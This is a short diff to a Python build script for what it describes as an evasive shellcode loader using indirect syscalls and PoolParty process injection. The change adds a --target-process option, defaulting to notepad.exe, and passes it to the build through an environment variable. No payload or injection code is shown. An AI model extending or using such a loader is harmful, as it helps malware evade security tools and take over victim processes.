@@ -5,6 +5,7 @@ import subprocess
 import argparse
 import random
 import json
+import os
 
 __dir__ = path.dirname(__file__)
 
@@ -51,6 +52,8 @@ def shellcode_encoder(shellcode: bytes) -> tuple[list[str], list[str]]:
 
 def main(parser: argparse.ArgumentParser):
     args = parser.parse_args()
+
+    os.environ["TARGET_PROCNAME"] = '\\"' + args.target_process + '\\"'
 
     if not args.quiet:
         for line in open(path.join(__dir__, "./ascii.txt"), "r").read().splitlines():
@@ -112,6 +115,7 @@ if __name__ == "__main__":
         description="Evasive shellcode loader with indirect syscalls, Thread name-calling allocation, PoolParty injection",
     )
     parser.add_argument("file", help="File to embed into the loader")
+    parser.add_argument("--target-process", "-tp", help="Target process name to inject", default="notepad.exe")
     parser.add_argument("--quiet", "-q", help="No banner", action="store_true")
     parser.add_argument("--debug", "-d", help="Debug flag", action="store_true")
     parser.add_argument("--docker", "-dk", help="Docker flag", action="store_true")
